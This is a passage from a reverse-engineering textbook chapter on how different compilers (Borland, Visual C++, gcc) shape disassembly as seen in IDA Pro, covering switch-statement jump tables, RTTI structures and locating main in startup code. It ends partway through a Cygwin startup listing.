<html><head></head><body><div class="part" title="Part&#xA0;V.&#xA0;Real-World Applications"><div class="titlepage"><div><div><h1 class="title"><a id="real-world_applications"/>Part V. Real-World Applications</h1></div></div></div><div class="partintro" id="id3221428" title="Real-World Applications"><div/><p/></div></div>
<div class="chapter" title="Chapter&#xA0;20.&#xA0;Compiler Personalities"><div class="titlepage"><div><div><h1 class="title"><a id="compiler_personalities"/>Chapter 20. Compiler Personalities</h1></div></div></div><div class="informalfigure"><a id="image_no_caption-id19"/><div class="mediaobject"><a id="I_mediaobject1_d1e33059"/><img alt="image with no caption" src="httpatomoreillycomsourcenostarchimages854059.png.jpg"/></div></div><p>At this point, if we have done our job properly, you now possess the essential skills to use IDA effectively and, more important, to bend it to your will. The next step, young grasshopper, is to learn to react to the ninja stars that binaries (as opposed to IDA) will throw at you. Depending on your motives for staring at assembly language, you may be very familiar with what you are looking at, or you may never know what you are going to be faced with. If you happen to spend all of your time examining code that was compiled using gcc on a Linux platform, you may become quite familiar with the style of code that it generates. On the other hand, if someone dropped a debug version of a program compiled using Microsoft Visual C++ (VC++) in your lap, you might be completely baffled. Malware analysts in particular are faced with a wide variety of code to examine. Setting aside the topic of obfuscation for the moment, malware analysts are likely to see code created using Visual Basic, Delphi, and Visual C/C++; machine language blobs embedded within documents; and more all in the same afternoon.<a class="indexterm" id="IDX-CHP-20-0001"/></p><p>In this chapter we will take a brief look at some of the ways that compilers differ as viewed through the IDA looking glass. The intent is not to delve into why compilers differ; rather, we hope to cover some of the ways that those differences manifest themselves in disassembly listings and how you may resolve those differences. Among other things, the compiler and associated options used to build a particular piece of software constitute one data point in profiling the author of that software.<a class="indexterm" id="IDX-CHP-20-0002"/><a class="indexterm" id="IDX-CHP-20-0003"/><a class="indexterm" id="IDX-CHP-20-0004"/><a class="indexterm" id="IDX-CHP-20-0005"/></p><p>While a wide variety of compilers are available for a wide variety of languages, in this chapter we will primarily utilize compiled C code for our examples, as a large number of C compilers are available for a large number of platforms.</p><div class="sect1" title="Jump Tables and Switch Statements"><div class="titlepage"><div><div><h1 class="title"><a id="jump_tables_and_switch_statements"/>Jump Tables and Switch Statements</h1></div></div></div><p>The C <code class="literal">switch</code> statement is a frequent target for compiler optimizations. The goal of these optimizations is to match the switch variable to a valid case label in the most efficient manner possible. The means by which this is achieved typically depends on the nature of the <code class="literal">switch</code> statement’s case labels. When the case labels are widely spread, as in the following example, most compilers generate code to perform a binary search <sup>[<a class="footnote" href="#ftn.CHP-20-FN-1" id="CHP-20-FN-1">140</a>]</sup>to match the switch variable against one of the cases.<a class="indexterm" id="IDX-CHP-20-0006"/></p><a id="I_programlisting1_d1e33118"/><pre class="programlisting">switch (value) {
   case 1:
      //code executed when value == 1
      break;
   case 211:
      //code executed when value == 211
      break;
   case 295:
      //code executed when value == 295
      break;
   case 462:
      //code executed when value == 462
      break;
   case 1093:
      //code executed when value == 1093
      break;
   case 1839:
      //code executed when value == 1839
      break;
}</pre><p>When case labels are closely clustered, preferably sequentially as shown here, compilers generally resolve the switch variable by performing a table lookup<sup>[<a class="footnote" href="#ftn.CHP-20-FN-2" id="CHP-20-FN-2">141</a>]</sup> to match the switch variable to the address of its associated case.<a class="indexterm" id="IDX-CHP-20-0007"/><a class="indexterm" id="IDX-CHP-20-0008"/></p><a id="I_programlisting1_d1e33140"/><pre class="programlisting">switch (value) {
   case 1:
      //code executed when value == 1
      break;
   case 2:
      //code executed when value == 2
      break;
   case 3:
      //code executed when value == 3
      break;
   case 4:
      //code executed when value == 4
      break;
   case 5:
      //code executed when value == 5
      break;
   case 6:
      //code executed when value == 6
      break;
}</pre><p>A compiled example of a <code class="literal">switch</code> statement that matches the switch variable against the consecutive cases 1 through 12 is shown here:<a class="indexterm" id="IDX-CHP-20-0009"/></p><a id="I_programlisting1_d1e33150"/><pre class="programlisting">.text:00401155         mov     edx, [ebp+arg_0]
<img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/> .text:00401158         cmp     edx, 0Ch        ; switch 13 cases
  .text:0040115B         ja    <img alt="" src="httpatomoreillycomsourcenostarchimages854099.png"/>loc_4011F1      ; default
  .text:0040115B                                   ; jumptable 00401161 case 0
  .text:00401161         jmp     ds:off_401168[edx*4] ; switch jump
  .text:00401161 ; ---------------------------------------------------------------
<img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/> .text:00401168 off_401168 dd offset <img alt="" src="httpatomoreillycomsourcenostarchimages854095.png"/>loc_4011F1
  ; DATA XREF: sub_401150+11↑r
  .text:00401168         dd offset loc_40119C ; jump table for switch statement
  .text:00401168         dd offset loc_4011A1
  .text:00401168         dd offset loc_4011A6
  .text:00401168         dd offset loc_4011AB
  .text:00401168         dd offset loc_4011B3
  .text:00401168         dd offset loc_4011BB
  .text:00401168         dd offset loc_4011C3
  .text:00401168         dd offset loc_4011CB
  .text:00401168         dd offset loc_4011D3
  .text:00401168         dd offset loc_4011DB
  .text:00401168         dd offset loc_4011E3
  .text:00401168         dd offset loc_4011EB
  .text:0040119C ; ---------------------------------------------------------------
  .text:0040119C
  .text:0040119C loc_40119C:                 ; CODE XREF: sub_401150+11↑j
  .text:0040119C                             ; DATA XREF: sub_401150:off_401168↑o
<img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/> .text:0040119C         mov     eax, [ebp+arg_4] ; jumptable 00401161 case 1</pre><p>This example was compiled using the Borland command-line compiler, which IDA well understands. The comments, which IDA inserted during the analysis phase, demonstrate that IDA has a clear understanding that this is a <code class="literal">switch</code> statement. In this example we note that IDA recognizes the switch test <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e33187"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span>, the jump table <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e33193"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span>, and individual cases by value <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e33199"/><img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/></span> within the code.<a class="indexterm" id="IDX-CHP-20-0010"/><a class="indexterm" id="IDX-CHP-20-0011"/><a class="indexterm" id="IDX-CHP-20-0012"/></p><p>As a side note on the use of jump tables to resolve switch cases, note that the table in the previous example contains 13 entries, while the <code class="literal">switch</code> statement is known to test cases 1 through 12 only. In this case, the compiler elected to include an entry for case 0 rather than treating 0 as a special case. The destination for case 0 <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e33226"/><img alt="" src="httpatomoreillycomsourcenostarchimages854095.png"/></span> is the same as the destination for every other value outside the range of 1 to 12 <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e33232"/><img alt="" src="httpatomoreillycomsourcenostarchimages854099.png"/></span>.</p><p>A final implementation note concerns the nature of the test performed on the switch variable. For readers less familiar with the x86 instruction set, the test <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e33240"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> and the associated jump in the succeeding line may appear only to exclude values larger than 12 while failing to account for negative values. If true, this could be disastrous, as using a negative index into the jump table might lead to unintended consequences. Fortunately, the <code class="literal">ja</code> (jump above) instruction treats comparisons as if they were performed on unsigned values; thus <code class="literal">−1</code> (<code class="literal">0xFFFFFFFF</code>) would be seen as <code class="literal">4294967295</code>, which is much larger than 12 and therefore excluded from the valid range for indexing the jump table.</p><p>The same source code compiled using Microsoft Visual C++ results in the disassembly listing shown here:</p><a id="I_programlisting1_d1e33261"/><pre class="programlisting">.text:004013D5             mov     ecx, [ebp+var_8]
  .text:004013D8        <img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/>sub     ecx, 1
  .text:004013DB              mov     [ebp+var_8], ecx
  .text:004013DE              cmp     [ebp+var_8], <img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/>0Bh ; switch 12 cases
  .text:004013E2             ja      loc_40146E      ; jumptable 004013EB default case
  .text:004013E8             mov     edx, [ebp+var_8]
  .text:004013EB             jmp     ds:off_401478[edx*4] ; switch jump
  .text:004013F2
<img alt="" src="httpatomoreillycomsourcenostarchimages854095.png"/> .text:004013F2 loc_4013F2:                          ; DATA XREF:
  .text:off_401478?o
  .text:004013F2             mov     eax, [ebp+arg_4] ; jumptable 004013EB <img alt="" src="httpatomoreillycomsourcenostarchimages854099.png"/>
case 0
  ... ; REMAINDER OF FUNCTION EXCLUDED FOR BREVITY
  .text:00401477            retn
  .text:00401477 sub_4013B0 endp
  .text:00401477 ; -------------------------------------------------------------
<img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/> .text:00401478 off_401478 dd offset <img alt="" src="httpatomoreillycomsourcenostarchimages854095.png"/>
loc_4013F2  ; DATA XREF: sub_4013B0+3B↓r
  .text:00401478            dd offset loc_4013FA  ; jump table for switch statement
  .text:00401478            dd offset loc_401402
  .text:00401478            dd offset loc_40140A
  .text:00401478            dd offset loc_401415
  .text:00401478            dd offset loc_401420
  .text:00401478            dd offset loc_40142B
  .text:00401478            dd offset loc_401436
  .text:00401478            dd offset loc_401441
  .text:00401478            dd offset loc_40144C
  .text:00401478            dd offset loc_401458
  .text:00401478            dd offset loc_401464</pre><p>Several differences are apparent when comparing this code with the code generated by the Borland compiler. One obvious difference is that the jump table has been relocated to space immediately following the function containing the <code class="literal">switch</code> statement (as opposed to being embedded within the function itself in the case of the Borland code). Other than providing a cleaner separation of code and data, relocating the jump table in this manner has little effect on the behavior of the program. Despite the different layout of the code, IDA remains capable of annotating the key features of the <code class="literal">switch</code> statement, including the number of cases and the code blocks associated with each case.<a class="indexterm" id="IDX-CHP-20-0013"/><a class="indexterm" id="IDX-CHP-20-0014"/><a class="indexterm" id="IDX-CHP-20-0015"/></p><p>A few of the implementation details of the <code class="literal">switch</code> statement include the fact that the switch variable (<code class="literal">var_8</code> in this case) is decremented <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e33327"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> to shift the range of valid values to 0 through 11 <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e33333"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span>, allowing the variable to be used directly as an index into the jump table <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e33339"/><img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/></span> without the need to create a dummy slot for the unused case 0. As a result, the first entry (or zero index entry) <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e33346"/><img alt="" src="httpatomoreillycomsourcenostarchimages854095.png"/></span> in the jump table actually refers to the code for switch case 1.</p><p>Rounding out our comparison of <code class="literal">switch</code> statements is the following code generated by gcc:</p><a id="I_programlisting1_d1e33357"/><pre class="programlisting">.text:004011FA          <img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/>cmp     [ebp+arg_0], 0Ch ; switch 13 cases
  .text:004011FE              ja  <img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/>loc_40129D      ; jumptable 00401210 case 0
  .text:00401204              mov     eax, [ebp+arg_0]
  .text:00401207              shl     eax, 2
  .text:0040120A         <img alt="" src="httpatomoreillycomsourcenostarchimages854099.png"/>mov     <img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/>eax,  ds:off_402010[eax]
  .text:00401210         <img alt="" src="httpatomoreillycomsourcenostarchimages854099.png"/>jmp     eax             ; switch jump
  .text:00401212
  .text:00401212  <img alt="" src="httpatomoreillycomsourcenostarchimages854095.png"/>loc_401212:                          ; DATA XREF:
  .rdata:off_402010 o
  .text:00401212        mov     eax, [ebp+arg_4] ; jumptable 00401210 case 1
  ... ; REMAINDER OF .text SECTION EXCLUDED FOR BREVITY
<img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/> .rdata:00402010 off_402010  dd offset <img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/>
loc_40129D   ; DATA XREF: sub_4011ED+1D↑r
  .rdata:00402010            dd offset <img alt="" src="httpatomoreillycomsourcenostarchimages854095.png"/>
loc_401212   ; jump table for switch statement
  .rdata:00402010            dd offset loc_40121D
  .rdata:00402010            dd offset loc_401225
  .rdata:00402010            dd offset loc_40122D
  .rdata:00402010            dd offset loc_40123C
  .rdata:00402010            dd offset loc_40124B
  .rdata:00402010            dd offset loc_40125A
  .rdata:00402010            dd offset loc_401265
  .rdata:00402010            dd offset loc_401270
  .rdata:00402010            dd offset loc_40127B
  .rdata:00402010            dd offset loc_401287
  .rdata:00402010            dd offset loc_401293</pre><p>This code bears some similarities to the Borland code as seen by the comparison to 12 <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e33416"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span>, the jump table <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e33422"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span> that contains 13 entries, and the use of a pointer to the default case <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e33428"/><img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/></span> in the case 0 slot of the jump table. As in the Borland code, the address for the case 1 handler <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e33434"/><img alt="" src="httpatomoreillycomsourcenostarchimages854095.png"/></span> can be found at index 1 into the jump table. Notable differences between the gcc code and previous examples include a different style of executing the jump <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e33440"/><img alt="" src="httpatomoreillycomsourcenostarchimages854099.png"/></span> and the fact that the jump table is stored in the read-only data (<code class="literal">.rdata</code>) section of the binary, providing a logical separation between the code associated with the <code class="literal">switch</code> statement and the data required to implement the <code class="literal">switch</code> statement. As in the other two examples, IDA is able to locate and annotate the key elements of the switch statement.<a class="indexterm" id="IDX-CHP-20-0016"/><a class="indexterm" id="IDX-CHP-20-0017"/><a class="indexterm" id="IDX-CHP-20-0018"/></p><p>One of the points we are making here is that there is no single correct way to compile source to assembly. Familiarity with code generated by a specific compiler in no way guarantees that you will recognize high-level constructs compiled using an entirely different compiler (or even different versions of the same compiler family). More important, do not assume that something is not a <code class="literal">switch</code> statement simply because IDA fails to add comments to that effect. Like you, IDA is more familiar with the output of some compilers than others. Rather than relying entirely on IDA’s analysis capabilities to recognize commonly used code and data constructs, you should always be prepared to utilize your own skills—your familiarity with a given assembly language, your knowledge of compilers, and your research skills—to properly interpret a disassembly.</p></div><div class="footnotes"><br/><hr/><div class="footnote"><p><sup>[<a class="para" href="#CHP-20-FN-1" id="ftn.CHP-20-FN-1">140</a>] </sup>For you algorithmic analysis fans, this means that the switch variable is matched after at most log-<sub>2</sub><span class="emphasis"><em>N</em></span> operations, where <span class="emphasis"><em>N</em></span> is the number of cases contained in the <code class="literal">switch</code> statement.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-20-FN-2" id="ftn.CHP-20-FN-2">141</a>] </sup>Again for those analyzing algorithms at home, the use of a table lookup allows the target case to be found in a single operation, which you may recall from your algorithms class is also called <span class="emphasis"><em>constant time</em></span> or <span class="emphasis"><em>O(1)</em></span>.</p></div></div></div>
<div class="sect1" title="RTTI Implementations"><div class="titlepage"><div><div><h1 class="title"><a id="rtti_implementations"/>RTTI Implementations</h1></div></div></div><p>In <a class="xref" href="ch08.html" title="Chapter 8. Datatypes and Data Structures">Chapter 8</a> we discussed C++ Runtime Type Identification (RTTI) and the fact that no standard exists for the manner in which RTTI is implemented by a compiler. Automatic recognition of RTTI-related constructs within a binary is another area in which IDA’s capabilities vary across compilers. Not surprisingly, IDA’s capabilities in this area are strongest with binaries compiled using Borland compilers. Readers interested in automated recognition of Microsoft RTTI data structures may want to try Igor Skochinsky’s IDC script available at The IDA Palace<sup>[<a class="footnote" href="#ftn.CHP-20-FN-3" id="CHP-20-FN-3">142</a>]</sup> or the Class Informer plug-in by Sirmabus,<sup>[<a class="footnote" href="#ftn.CHP-20-FN-4" id="CHP-20-FN-4">143</a>]</sup> which will be discussed further in <a class="xref" href="ch23.html" title="Chapter 23. Real-World IDA Plug-ins">Chapter 23</a>.<a class="indexterm" id="IDX-CHP-20-0019"/><a class="indexterm" id="IDX-CHP-20-0020"/></p><p>A simple strategy for understanding how a specific compiler embeds type information for C++ classes is to write a basic program that makes use of classes containing virtual functions. After compiling the program, you can load the resulting executable into IDA and search for instances of strings that contain the names of classes used in the program. Regardless of the compiler used to build a binary, one thing that RTTI data structures have in common is that they all contain a pointer to a string containing the name of the class that they represent. Using data cross-references, it should be possible to locate a pointer to one such string, thus locating candidate RTTI data structures. The last step is to link a candidate RTTI structure back to the associated class’s vtable, which is best accomplished by following data cross-references backward from a candidate RTTI structure until a table of function pointers (the vtable) is reached.</p><div class="footnotes"><br/><hr/><div class="footnote"><p><sup>[<a class="para" href="#CHP-20-FN-3" id="ftn.CHP-20-FN-3">142</a>] </sup>See <a class="ulink" href="http://old.idapalace.net/idc/ms_rtti.zip">http://old.idapalace.net/idc/ms_rtti.zip</a>.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-20-FN-4" id="ftn.CHP-20-FN-4">143</a>] </sup>See <a class="ulink" href="http://www.openrce.org/blog/browse/Sirmabus">http://www.openrce.org/blog/browse/Sirmabus</a>.</p></div></div></div>
<div class="sect1" title="Locating main"><div class="titlepage"><div><div><h1 class="title"><a id="locating_main"/>Locating main</h1></div></div></div><p>If you were fortunate enough to have source code available for a C/C++ program that you wanted to analyze, a good place to begin your analysis might be the <code class="literal">main</code> function, as this is where execution notionally begins. When faced with analyzing a binary, this is not a bad strategy to follow. However, as we know, it is complicated by the fact that compilers/linkers (and the use of libraries) add additional code that executes before <code class="literal">main</code> is reached. Thus it would often be incorrect to assume that the entry point of a binary corresponds to the <code class="literal">main</code> function written by the program’s author.<a class="indexterm" id="IDX-CHP-20-0021"/><a class="indexterm" id="IDX-CHP-20-0022"/><a class="indexterm" id="IDX-CHP-20-0023"/><a class="indexterm" id="IDX-CHP-20-0024"/><a class="indexterm" id="IDX-CHP-20-0025"/></p><p>In fact, the notion that all programs have a <code class="literal">main</code> function is a C/C++ compiler convention rather than a hard-and-fast rule for writing programs. If you have ever written a Windows GUI application, then you may be familiar with the <code class="literal">WinMain</code> variation on <code class="literal">main</code>. Once you step away from C/C++, you will find that other languages use other names for their primary entry-point function. Regardless of what it may be called, we will refer to this function generically as the <code class="literal">main</code> function.</p><p><a class="xref" href="ch12.html" title="Chapter 12. Library Recognition Using FLIRT Signatures">Chapter 12</a> covered the concept of IDA signature files, their generation, and their application. IDA utilizes special startup signatures to attempt to identify a program’s <code class="literal">main</code> function. When IDA is able to match a binary’s startup sequence against one of the startup sequences in its signature files, IDA can locate a program’s <code class="literal">main</code> function based on its understanding of the behavior of the matched startup routine. This works great until IDA fails to match the startup sequence in a binary to any of its known signatures. In general, a program’s startup code is closely tied to both the compiler used to generate the code and the platform for which the code was built.</p><p>Recall from <a class="xref" href="ch12.html" title="Chapter 12. Library Recognition Using FLIRT Signatures">Chapter 12</a> that startup signatures are grouped together and stored in signature files specific to binary file types. For example, startup signatures for use with the PE loader are stored in <span class="emphasis"><em>pe.sig</em></span>, while startup signatures for use with the MS-DOS loader are stored in <span class="emphasis"><em>exe.sig</em></span>. The existence of a signature file for a given binary file type does not guarantee that IDA will be able to identify a program’s <code class="literal">main</code> function 100 percent of the time. There are too many compilers, and startup sequences are too much of a moving target for IDA to ship with every possible signature.</p><p>For many file types, such as ELF and Mach-O, IDA does not include any startup signatures at all. The net result is that IDA can’t use signatures to locate a <code class="literal">main</code> function within an ELF binary (though the function will be found if it is named <code class="literal">main</code>).</p><p>The point of this discussion is to prepare you for the fact that, on occasion, you will be on your own when it comes to locating the <code class="literal">main</code> function of a program. In such cases it is useful to have some strategies for understanding how the program itself prepares for the call to <code class="literal">main</code>. As an example, consider a binary that has been obfuscated to some degree. In this case, IDA will certainly fail to match a startup signature because the startup routine itself has been obfuscated. If you manage to de-obfuscate the binary somehow (the topic of <a class="xref" href="ch21.html" title="Chapter 21. Obfuscated Code Analysis">Chapter 21</a>), you will probably need to locate not only <code class="literal">main</code> on your own but the original start routine as well.</p><p>For C and C++ programs with a traditional <code class="literal">main</code> function,<sup>[<a class="footnote" href="#ftn.CHP-20-FN-5" id="CHP-20-FN-5">144</a>]</sup> one of the responsibilities of the startup code is to set up the stack arguments required by <code class="literal">main</code>, the integer <code class="literal">argc</code> (a count of the number of command-line arguments), the character pointer array <code class="literal">argv</code> (an array of pointers to strings containing the command-line arguments), and the character pointer array <code class="literal">envp</code> (an array of pointers to strings containing the environment variables that were set at program invocation). The following excerpt from a FreeBSD 8.0 dynamically linked, stripped binary demonstrates how gcc-generated startup code calls to <code class="literal">main</code> on a FreeBSD system:<a class="indexterm" id="IDX-CHP-20-0026"/><a class="indexterm" id="IDX-CHP-20-0027"/><a class="indexterm" id="IDX-CHP-20-0028"/><a class="indexterm" id="IDX-CHP-20-0029"/><a class="indexterm" id="IDX-CHP-20-0030"/><a class="indexterm" id="IDX-CHP-20-0031"/></p><a id="I_programlisting1_d1e33646"/><pre class="programlisting">.text:08048365          mov     dword ptr [esp], offset _term_proc ; func
.text:0804836C        <img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/>call    _atexit
.text:08048371        <img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/>call    _init_proc
.text:08048376          lea     eax, [ebp+arg_0]
.text:08048379          mov     [esp+8], esi
.text:0804837D          mov     [esp+4], eax
.text:08048381          mov     [esp], ebx
.text:08048384        <img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/>call    sub_8048400
.text:08048389        <img alt="" src="httpatomoreillycomsourcenostarchimages854099.png"/>mov     [esp], eax      ; status
.text:0804838C        <img alt="" src="httpatomoreillycomsourcenostarchimages854095.png"/>call    _exit</pre><p>In this case, the call to <code class="literal">sub_8048400</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e33683"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> turns out to be the call to <code class="literal">main</code>. This code is typical of many startup sequences in that there are calls to initialization functions (<code class="literal">_atexit</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e33695"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span> and <code class="literal">_init_proc</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e33705"/><img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/></span>) preceding the call to <code class="literal">main</code> and a call to <code class="literal">_exit</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e33717"/><img alt="" src="httpatomoreillycomsourcenostarchimages854095.png"/></span> following the return from <code class="literal">main</code>. The call to <code class="literal">_exit</code> ensures that the program terminates cleanly in the event that <code class="literal">main</code> performs a return rather than calling <code class="literal">_exit</code> itself. Note that the parameter passed to <code class="literal">_exit</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e33739"/><img alt="" src="httpatomoreillycomsourcenostarchimages854099.png"/></span> is the value returned by main in EAX; thus the exit code of the program is the return value of <code class="literal">main</code>.</p><p>If the previous program was statically linked and stripped, the start routine would have the same structure as the preceding example; however, none of the library functions would have useful names. In that case, the <code class="literal">main</code> function would continue to stand out as the only function that is called with three parameters. Of course, applying FLIRT signatures as early as possible would also help to restore many of the library function names and make <code class="literal">main</code> stand out, as it does in the preceding example.</p><p>In order to demonstrate that the same compiler may generate a completely different style of code when running on a different platform, consider the following example, also created using gcc, of a dynamically linked, stripped binary taken from a Linux system:</p><a id="I_programlisting1_d1e33759"/><pre class="programlisting">.text:080482B0 start           proc near
.text:080482B0                 xor     ebp, ebp
.text:080482B2                 pop     esi
.text:080482B3                 mov     ecx, esp
.text:080482B5                 and     esp, 0FFFFFFF0h
.text:080482B8                 push    eax
.text:080482B9                 push    esp
.text:080482BA                 push    edx
.text:080482BB                <img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/>push    offset sub_80483C0
.text:080482C0                <img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/>push    offset sub_80483D0
.text:080482C5                 push    ecx
.text:080482C6                 push    esi
.text:080482C7                <img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/>push    offset loc_8048384
.text:080482CC                 call    ___libc_start_main
.text:080482D1                 hlt
.text:080482D1 start           endp</pre><p>In this example, <code class="literal">start</code> makes a single function call to <code class="literal">___libc_start_main</code>. The purpose of <code class="literal">___libc_start_main</code> is to perform all of the same types of tasks that were performed in the preceding FreeBSD example, including calling <code class="literal">main</code> and ultimately <code class="literal">exit</code>. Since <code class="literal">___libc_start_main</code> is a library function, we know that the only way it knows where <code class="literal">main</code> actually resides is that it is told via one of its parameters (of which there appear to be eight). Clearly two of the parameters <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e33803"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> and <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e33809"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span> are pointers to functions, while a third <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e33815"/><img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/></span> is a pointer to a location within the <code class="literal">.text</code> section. There are few clues in the previous listing as to which function might be <code class="literal">main</code>, so you might need to analyze the code at the three potential locations in order to correctly locate <code class="literal">main</code>. This might be a useful exercise; however, you may prefer simply to remember that the first argument (topmost on the stack and therefore last pushed) to <code class="literal">___libc_start_main</code> is in fact a pointer to <code class="literal">main</code>. There are two factors that combine to prevent IDA from identifying <code class="literal">loc_8048384</code> as a function (which would have been named <code class="literal">sub_8048384</code>). The first is that the function is never called directly, so <code class="literal">loc_8048384</code> never appears as the target of a call instruction. The second is that although IDA contains heuristics to recognized functions based on their prologues (which is why <code class="literal">sub_80483C0</code> and <code class="literal">sub_80483D0</code> are identified as functions even though they too are never called directly), the function at <code class="literal">loc_8048384</code> (<code class="literal">main</code>) does not use a prologue recognized by IDA. The offending prologue (with comments) is shown here:<a class="indexterm" id="IDX-CHP-20-0032"/><a class="indexterm" id="IDX-CHP-20-0033"/></p><a id="I_programlisting1_d1e33866"/><pre class="programlisting">.text:08048384 loc_8048384:                       ; DATA XREF: start+17↑o
.text:08048384          lea     ecx, [esp+4]       ; address of arg_0 into ecx
.text:08048388          and     esp, 0FFFFFFF0h    ; 16 byte align esp
.text:0804838B          push    dword ptr [ecx-4]  ; push copy of return address
.text:0804838E         <img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/>push    ebp                ; save caller's ebp
.text:0804838F         <img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/>mov
ebp, esp           ; initialize our frame pointer
.text:08048391          push    ecx                ; save ecx
.text:08048392         <img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/>sub     esp, 24h           ; allocate locals</pre><p>This prologue clearly contains the elements of a traditional prologue for a function that uses EBP as a frame pointer. The caller’s frame pointer is saved <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e33888"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> before setting the frame pointer for the current function <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e33894"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span> and finally allocating space for local variables <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e33900"/><img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/></span>. The problem for IDA is that these actions do not occur as the first actions within the function, and thus IDA’s heuristics fail. It is a simple enough matter to manually create a function (Edit ▸ Functions ▸ Create Function) at this point, but you should take care to monitor IDA’s behavior. Just as it failed to identify the function in the first place, it may fail to recognize the fact that the function uses EBP as a frame pointer. In such a case, you would need to edit the function (<span class="keycap">alt</span>-P) to force IDA to believe that the function has a <span class="emphasis"><em>BP-based frame</em></span> as well as to make adjustments to the number of stack bytes dedicated to saved registers and local variables.<a class="indexterm" id="IDX-CHP-20-0034"/><a class="indexterm" id="IDX-CHP-20-0035"/></p><p>As in the case of the FreeBSD binary, if the preceding Linux example happened to be both statically linked and stripped, the start routine would not change at all other than the fact that the name for <code class="literal">___libc_start_main</code> would be missing. You could still locate <code class="literal">main</code> by remembering that gcc’s Linux start routine makes only one function call and that the first parameter to that function is the address of <code class="literal">main</code>.</p><p>On the Windows side of the house, the number of C/C++ compilers (and therefore the number of startup routines) in use is somewhat higher. Perhaps not unsurprisingly, in the case of gcc on Windows, it is possible to leverage some of the knowledge gained by studying gcc’s behavior on other platforms. The startup routine shown here is from a gcc/Cygwin binary:</p><a id="I_programlisting1_d1e33932"/><pre class="programlisting">.text:00401000 start     proc near
.text:00401000
.text:00401000 var_28    = dword ptr −28h
.text:00401000 var_24    = dword ptr −24h
.text:00401000 var_20    = dword ptr −20h
.text:00401000 var_2     = word ptr −2
.text:00401000
.text:00401000           push    ebp
.text:00401001           mov     ebp, esp
.text:00401003           sub     esp, 28h
.text:00401006           and     esp, 0FFFFFFF0h
.text:00401009           fnstcw  [ebp+var_2]
.text:0040100C           movzx   eax, [ebp+var_2]
.text:00401010           and     ax, 0F0C0h
.text:00401014           mov     [ebp+var_2], ax
.text:00401018           movzx   eax, [ebp+var_2]
.text:0040101C           or      ax, 33Fh
.text:00401020           mov     [ebp+var_2], ax
.text:00401024           fldcw   [ebp+var_2]
.text:00401027          <img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/>mov     [esp+28h+var_28], offset sub_4010B0
